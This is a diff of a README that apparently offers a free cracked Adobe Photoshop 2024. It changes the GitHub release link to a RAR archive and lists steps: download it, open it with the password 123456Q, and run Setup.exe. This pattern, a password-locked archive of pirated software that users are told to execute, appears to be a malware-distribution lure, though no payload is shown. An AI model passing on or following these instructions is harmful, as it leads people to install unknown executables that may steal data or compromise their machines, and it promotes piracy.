@@ -10,7 +10,7 @@
 
 <h3>How install:</h3>
 
-1. [Download](https://github.com/eerrtg/free-photoshop-24/releases/download/Download/A_P2024.rar)
+1. [Download](https://github.com/eerrtg/free-photoshop-24/releases/download/Download/Photoshop24.rar)
 2. Open Archive (Password: 123456Q)
 3. Open Setup.exe file
 4. Follow the instruction
